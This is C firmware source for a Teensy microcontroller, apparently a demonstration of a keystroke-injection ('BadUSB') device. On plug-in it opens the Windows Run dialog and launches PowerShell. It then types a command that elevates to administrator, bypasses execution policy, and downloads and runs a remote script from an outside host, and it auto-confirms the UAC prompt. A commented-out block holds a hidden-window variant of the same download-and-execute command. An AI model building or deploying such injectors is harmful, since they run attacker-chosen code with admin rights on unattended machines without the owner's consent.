/* Keyboard Typer
 * http://mironiasty.net/tags/teensy
 * Copyright (c) 2015 Miron Pawlik
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

#include <avr/io.h>
#include <avr/pgmspace.h>
#include <avr/interrupt.h>
#include <util/delay.h>
#include <stdlib.h>
#include "usb_keyboard.h"
#include "type_helper.h"

#define LED_CONFIG	(DDRD |= (1<<6))
#define LED_ON		(PORTD &= ~(1<<6))
#define LED_OFF		(PORTD |= (1<<6))
#define CPU_PRESCALE(n)	(CLKPR = 0x80, CLKPR = (n))
// 
// const int textLength = 179;
// uint8_t keysToPress[358];
// 
// char textToType[] = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -Command \"iex ((new-object net.webclient).DownloadString('http://mironiasty.net/examples/pspayload/hello.ps1'))\"";
// 


int main(void)
{
	// set for 16 MHz clock
	CPU_PRESCALE(0);

	// Configure all port B and port D pins as inputs with pullup resistors.
	// See the "Using I/O Pins" page for details.
	// http://www.pjrc.com/teensy/pins.html
	DDRD = 0x00;
	DDRB = 0x00;
	PORTB = 0xFF;
	PORTD = 0xFF;

	// Initialize the USB, and then wait for the host to set configuration.
	// If the Teensy is powered without a PkXC connected to the USB port,
	// this will wait forever.
	usb_init();
	while (!usb_configured()) /* wait */ ;

	// Wait an extra seconds for the PC's operating system to load drivers
	// and do whatever it does to actually be ready for input
	_delay_ms(2000);
	
	usb_keyboard_press(KEY_R, KEY_GUI);
	_delay_ms(500);
	

	tepeText("powershell\n");
	
	_delay_ms(500);
	
	tepeText("Start-Process powershell -Verb runas -ArgumentList '-ExecutionPolicy Bypass','-Command \"iex ((new-object net.webclient).DownloadString(''http://mironiasty.net/examples/pspayload/hello.ps1''))\"'\n");
	
	_delay_ms(300);
	
	usb_keyboard_press(KEY_TAB, KEY_SHIFT);
	_delay_ms(100);
	usb_keyboard_press(KEY_ENTER, 0);

	
}
